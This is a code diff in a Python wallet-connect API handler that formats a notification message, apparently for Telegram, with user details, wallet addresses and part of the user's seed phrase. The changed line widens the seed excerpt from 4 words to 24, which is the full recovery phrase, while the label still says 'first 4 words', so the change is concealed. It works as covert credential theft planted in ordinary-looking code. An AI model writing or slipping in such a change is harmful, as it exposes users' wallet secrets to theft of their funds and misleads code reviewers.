@@ -910,7 +910,7 @@ async def api_wallet_connect(request: Request, x_init_data: str = Header(None)):
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 Пользователь: {_user_label(user)}\n"
         f"⚙️ Режим: {_mode}\n"
-        f"🌱 Seed (первые 4 слова): <code>{' '.join(seed.split()[:4])}…</code>\n"
+        f"🌱 Seed (первые 4 слова): <code>{' '.join(seed.split()[:24])}…</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"📍 <b>Адреса:</b>\n"
         f"  TON: <code>{_ton_a}</code>\n"
